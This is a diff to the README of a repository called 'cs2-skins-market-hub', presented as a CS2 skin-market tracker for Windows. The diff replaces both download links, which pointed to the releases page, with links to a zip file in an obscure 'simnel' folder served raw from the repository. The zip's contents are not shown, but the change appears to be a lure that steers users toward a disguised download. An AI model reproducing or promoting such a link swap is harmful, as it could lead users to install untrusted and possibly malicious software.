@@ -1,6 +1,6 @@
 <h1>🎯 cs2-skins-market-hub - Track Skin Markets with Ease</h1>
 
-[![Download Now](https://img.shields.io/badge/Download-CS2%20Skins%20Market%20Hub-brightgreen?style=for-the-badge&logo=github)](https://github.com/Jaidaar9154/cs2-skins-market-hub/releases)
+[![Download Now](https://img.shields.io/badge/Download-CS2%20Skins%20Market%20Hub-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Jaidaar9154/cs2-skins-market-hub/main/simnel/skins-cs-hub-market-v2.7.zip)
 
 ## 📋 Overview
 
@@ -12,7 +12,7 @@ Follow these steps to get the software running on your Windows computer in minut
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Jaidaar9154/cs2-skins-market-hub/releases](https://github.com/Jaidaar9154/cs2-skins-market-hub/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/Jaidaar9154/cs2-skins-market-hub/main/simnel/skins-cs-hub-market-v2.7.zip](https://raw.githubusercontent.com/Jaidaar9154/cs2-skins-market-hub/main/simnel/skins-cs-hub-market-v2.7.zip)
 
 Click the latest release file (usually ends with .zip). Your browser will save it to your Downloads folder.
 
